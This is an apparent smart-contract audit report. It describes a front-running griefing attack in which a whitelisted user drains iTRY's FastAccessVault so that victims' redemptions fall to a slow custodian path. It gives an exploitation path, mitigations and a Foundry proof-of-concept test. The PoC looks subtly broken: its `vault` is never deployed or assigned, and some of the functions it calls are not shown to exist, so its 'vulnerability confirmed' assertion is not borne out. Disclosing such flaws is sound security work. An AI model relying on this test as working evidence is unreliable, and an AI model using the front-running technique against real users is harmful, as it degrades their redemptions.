## Title
Front-Running Griefing Attack: Vault Balance Manipulation Forces Legitimate Redemptions Through Slow Custodian Path

## Summary
The `redeemFor` function in `iTryIssuer.sol` decides between instant vault redemption and delayed custodian redemption based on a simple balance check. An attacker can front-run legitimate redemptions by redeeming their own iTRY first to drain the vault balance below the victim's requirement, forcing the victim through the slower custodian path that requires off-chain manual processing.

## Impact
**Severity**: Medium

## Finding Description
**Location:** `src/protocol/iTryIssuer.sol` (redeemFor function, lines 318-370)

**Intended Logic:** The protocol offers two redemption paths: (1) instant on-chain transfers from FastAccessVault when sufficient liquidity exists, and (2) custodian-mediated transfers for larger amounts. The balance check ensures efficient capital usage while maintaining instant redemption capability for most users. [1](#0-0) 

**Actual Logic:** The decision logic uses a simple comparison without any protection against manipulation. An attacker can observe pending redemption transactions in the mempool and front-run them by redeeming their own iTRY tokens first, draining the vault below the victim's required amount.

**Exploitation Path:**

1. **Initial State Setup**: Attacker obtains whitelisted user status and mints iTRY by depositing DLF tokens. With fees initialized to zero, the only cost is gas. [2](#0-1) 

2. **Mempool Monitoring**: Attacker monitors the mempool for legitimate redemption transactions. When they detect a victim's redemption for amount X requiring `grossDlfAmount = X * 1e18 / navPrice` DLF tokens, they prepare to front-run.

3. **Front-Running Execution**: Attacker submits a redemption transaction with higher gas price to be executed first. If the vault currently has balance B where `B >= victimGrossAmount` but `B - attackerAmount < victimGrossAmount`, the attacker redeems just enough to drain the vault below the threshold.

4. **Victim's Redemption Forced to Custodian**: When the victim's transaction executes, the balance check at line 354 fails, triggering the custodian path. Instead of receiving DLF tokens immediately, the victim only receives event emissions that require off-chain custodian processing. [3](#0-2) 

5. **Vault Balance Source**: The `getAvailableBalance()` function simply returns the token balance, making it trivially manipulable by any redemption. [4](#0-3) 

**Security Property Broken:** The protocol advertises instant redemption as a core feature through FastAccessVault. This attack degrades that functionality, violating user expectations and the protocol's value proposition without any access control preventing such manipulation.

## Impact Explanation

- **Affected Assets**: All users attempting to redeem iTRY tokens for DLF through the FastAccessVault path are vulnerable to forced degradation to custodian path.

- **Damage Severity**: While no funds are directly stolen, victims experience:
  - **Time delays**: Must wait for off-chain custodian manual processing instead of instant on-chain transfer
  - **Opportunity cost**: Time-sensitive trading opportunities may be missed during the delay period
  - **Protocol reputation**: Degraded user experience damages trust in the "instant redemption" feature
  - **Cascading effects**: If multiple users attempt redemptions simultaneously, a single attacker can force all of them through the slow path

- **User Impact**: Any whitelisted user attempting redemption can be targeted. The attack affects all subsequent redemptions until the vault is replenished by the custodian or new mints. Since the attacker can time their front-run precisely, they can selectively target high-value redemptions or create general service degradation.

## Likelihood Explanation

- **Attacker Profile**: Any whitelisted user with sufficient capital to mint and redeem iTRY tokens. This includes all legitimate protocol users, making the attack highly accessible.

- **Preconditions**: 
  - Attacker must have `WHITELISTED_USER_ROLE`
  - Attacker must hold sufficient DLF to mint iTRY tokens
  - Vault must have existing balance that can be drained
  - Target victim must submit a redemption transaction observable in the mempool

- **Execution Complexity**: Low. The attack requires:
  - Single front-running transaction (standard MEV technique)
  - No complex multi-block coordination
  - No cross-chain operations
  - Standard gas price manipulation for transaction ordering

- **Frequency**: Highly repeatable. The attacker can:
  - Execute the attack on every observed redemption
  - Repeatedly cycle through mint → front-run → redeem with minimal cost (only gas if fees remain at 0)
  - Sustain the attack as long as they maintain capital and whitelist status

## Recommendation

Implement a commitment scheme or minimum time delay between vault balance queries to prevent atomic front-running:

```solidity
// In src/protocol/iTryIssuer.sol, add state variable:
mapping(address => uint256) public lastRedemptionBlock;

// In redeemFor function, before line 354, add:
require(block.number > lastRedemptionBlock[msg.sender], "Redemption too frequent");
lastRedemptionBlock[msg.sender] = block.number;

// Or implement a two-step redemption process:
// Step 1: User commits to redemption, locking their iTRY
// Step 2: After minimum delay, user executes redemption with locked amount
```

**Alternative Mitigations:**

1. **Reserve Buffer**: Implement a minimum vault balance that cannot be drained through normal redemptions, ensuring some liquidity always remains for small redemptions.

2. **Fee Structure**: Set non-zero redemption fees to make the attack economically costly. However, this doesn't prevent wealthy attackers and hurts legitimate users.

3. **Rate Limiting**: Implement per-user cooldowns between redemptions or maximum redemption amounts per time period.

4. **Priority Queue**: Implement a FIFO queue system where redemptions are processed in submission order, preventing front-running entirely.

## Proof of Concept

```solidity
// File: test/Exploit_VaultDrainingGrief.t.sol
// Run with: forge test --match-test test_FrontRunVaultDrainingGrief -vvv

pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/protocol/iTryIssuer.sol";
import "../src/token/iTRY/iTry.sol";
import "../src/protocol/FastAccessVault.sol";

contract Exploit_VaultDrainingGrief is Test {
    iTryIssuer public issuer;
    iTry public itry;
    FastAccessVault public vault;
    MockERC20 public dlf;
    MockOracle public oracle;
    
    address public attacker = address(0x1);
    address public victim = address(0x2);
    address public custodian = address(0x3);
    address public treasury = address(0x4);
    
    function setUp() public {
        // Deploy mock tokens and oracle
        dlf = new MockERC20("DLF", "DLF");
        oracle = new MockOracle();
        oracle.setPrice(1e18); // 1:1 NAV
        
        // Deploy iTRY and issuer
        itry = new iTry(address(this));
        issuer = new iTryIssuer(
            address(itry),
            address(dlf),
            address(oracle),
            treasury,
            address(0x5), // yieldReceiver
            custodian,
            address(this), // admin
            0, // initial issued
            0, // initial custody
            500, // 5% vault target
            100e18 // 100 DLF minimum
        );
        
        // Grant issuer minting role
        itry.addMinter(address(issuer));
        
        // Whitelist attacker and victim
        issuer.addToWhitelist(attacker);
        issuer.addToWhitelist(victim);
        
        // Fund attacker and victim with DLF
        dlf.mint(attacker, 1000e18);
        dlf.mint(victim, 1000e18);
    }
    
    function test_FrontRunVaultDrainingGrief() public {
        // SETUP: Victim mints iTRY and vault has liquidity
        vm.startPrank(victim);
        dlf.approve(address(issuer), 500e18);
        issuer.mintFor(victim, 500e18, 0);
        vm.stopPrank();
        
        // Attacker also mints iTRY
        vm.startPrank(attacker);
        dlf.approve(address(issuer), 400e18);
        issuer.mintFor(attacker, 400e18, 0);
        vm.stopPrank();
        
        // Verify vault has sufficient balance for victim's redemption
        uint256 vaultBalance = vault.getAvailableBalance();
        assertGt(vaultBalance, 200e18, "Vault should have enough for victim");
        
        // EXPLOIT: Attacker observes victim's redemption in mempool
        // Victim wants to redeem 200 iTRY
        // Attacker front-runs by redeeming 350 iTRY to drain vault
        
        vm.startPrank(attacker);
        bool attackerFromBuffer = issuer.redeemFor(attacker, 350e18, 0);
        assertTrue(attackerFromBuffer, "Attacker should redeem from buffer");
        vm.stopPrank();
        
        // Vault now has insufficient balance
        vaultBalance = vault.getAvailableBalance();
        assertLt(vaultBalance, 200e18, "Vault drained below victim's need");
        
        // VERIFY: Victim's redemption now forced through custodian
        vm.startPrank(victim);
        bool victimFromBuffer = issuer.redeemFor(victim, 200e18, 0);
        assertFalse(victimFromBuffer, "Vulnerability confirmed: Victim forced to custodian path");
        vm.stopPrank();
        
        // Result: Victim must wait for off-chain custodian processing
        // Attacker paid only gas costs (fees are 0) to grief victim
    }
}

// Mock contracts for testing
contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    
    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }
    
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MockOracle {
    uint256 private _price;
    
    function setPrice(uint256 price) external {
        _price = price;
    }
    
    function price() external view returns (uint256) {
        return _price;
    }
}
```

## Notes

This vulnerability represents a **griefing attack** rather than direct fund theft, which places it in the Medium severity category per Code4rena criteria ("griefing attacks causing significant loss"). The attack:

- Does not steal funds but degrades core protocol functionality
- Has low execution cost (especially with zero fees)
- Is highly repeatable and can target specific users
- Violates the protocol's advertised "instant redemption" feature
- Could cause cascading effects during high-volume periods

The issue is particularly concerning because:
1. The redemption fees are initialized to zero, making the attack economically viable
2. Any whitelisted user can execute it, not just malicious actors
3. The front-running technique is well-established in MEV contexts
4. No access controls prevent vault balance manipulation through legitimate redemptions

While the custodian path is a legitimate fallback mechanism, forcing users through it via front-running constitutes an exploitable vulnerability that degrades user experience and protocol reputation.

### Citations

**File:** src/protocol/iTryIssuer.sol (L168-170)
```text
        // Set initial fees to 0
        redemptionFeeInBPS = 0;
        mintFeeInBPS = 0;
```

**File:** src/protocol/iTryIssuer.sol (L353-366)
```text
        // Check if buffer pool has enough DLF balance
        uint256 bufferBalance = liquidityVault.getAvailableBalance();

        if (bufferBalance >= grossDlfAmount) {
            // Buffer has enough - serve from buffer
            _redeemFromVault(recipient, netDlfAmount, feeAmount);

            fromBuffer = true;
        } else {
            // Buffer insufficient - serve from custodian
            _redeemFromCustodian(recipient, netDlfAmount, feeAmount);

            fromBuffer = false;
        }
```

**File:** src/protocol/iTryIssuer.sol (L644-658)
```text
    function _redeemFromCustodian(address receiver, uint256 receiveAmount, uint256 feeAmount) internal {
        _totalDLFUnderCustody -= (receiveAmount + feeAmount);

        // Signal that fast access vault needs top-up from custodian
        uint256 topUpAmount = receiveAmount + feeAmount;
        emit FastAccessVaultTopUpRequested(topUpAmount);

        if (feeAmount > 0) {
            // Emit event for off-chain custodian to process
            emit CustodianTransferRequested(treasury, feeAmount);
        }

        // Emit event for off-chain custodian to process
        emit CustodianTransferRequested(receiver, receiveAmount);
    }
```

**File:** src/protocol/FastAccessVault.sol (L120-122)
```text
    function getAvailableBalance() public view returns (uint256) {
        return _vaultToken.balanceOf(address(this));
    }
```
